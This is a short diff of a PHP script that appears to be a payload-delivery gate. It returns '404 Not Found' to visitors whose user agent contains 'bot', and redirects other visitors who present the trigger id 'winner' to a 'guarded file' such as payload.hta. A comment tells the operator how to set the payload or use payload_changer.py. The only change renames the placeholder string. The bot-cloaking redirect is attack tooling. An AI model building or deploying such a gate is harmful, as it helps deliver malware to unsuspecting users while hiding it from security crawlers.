@@ -28,10 +28,10 @@ if(isset($_GET['id']) && $_GET['id'] == "winner") {
         elseif(preg_match("/bot/i", $_SERVER['HTTP_USER_AGENT'])) {
             header("HTTP/1.0 404 Not Found");  
         }
-/* Modify "payloadinitialized" string to be your guarded file (payload.hta, etc) UNLESS you are using this with payload_changer.py.  
+/* Modify "placeholder" string to be your guarded file (payload.hta, etc) UNLESS you are using this with payload_changer.py.  
 If you are using it with the python script you will enter it with the -p parameter. */
         else { 
-        header("Location: payloadinitialized");
+        header("Location: placeholder");
         }
     }
     else {
